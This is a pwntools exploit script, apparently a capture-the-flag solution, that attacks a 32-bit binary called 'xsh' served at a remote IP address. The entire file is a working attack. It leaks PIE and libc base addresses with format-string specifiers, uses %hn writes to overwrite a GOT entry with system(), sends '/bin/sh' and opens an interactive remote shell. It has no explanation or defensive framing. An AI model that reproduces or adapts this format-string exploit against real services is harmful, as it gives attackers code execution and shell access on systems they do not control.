from pwn import *
def cmd(c):
	p.sendlineafter(" ",c.ljust(0x100,'\x00'))
context.log_level='debug'
libc=ELF("./libc.so")
#p=process('./xsh',env={"LD_PRELOAD":"./libc.so"})

p=remote("35.192.206.226",5555)
#gdb.attach(p,'b *0x5655632e')
cmd("echo |%3$p|%5$p|")
p.readuntil("|")
pie=int(p.readuntil("|")[:-1],16)-(0x56556249-0x56555000)
#base=int(p.readuntil("|")[:-1],16)#-(0xf7fb2d80-0xf7dda000)
log.warning(hex(pie))


cmd("echo %31$s".format().ljust(0x20,'\x00')+p32(0x0004010+pie))
base=u32(p.read(4))-0x00063990
log.warning(hex(base))
#raw_input()

got=0x0004034+pie
libc.address=base
one=libc.sym['system']
p1=one&0xffff
p2=one>>16
log.warning(hex(p1))
log.warning(hex(p2))
cmd("echo %{}c%31$hn%{}c%32$hn".format(p1,p2-p1).ljust(0x20,'\x00')+p32(got)+p32(got+2))
cmd("/bin/sh".ljust(0x64,'\x00'))

p.interactive()
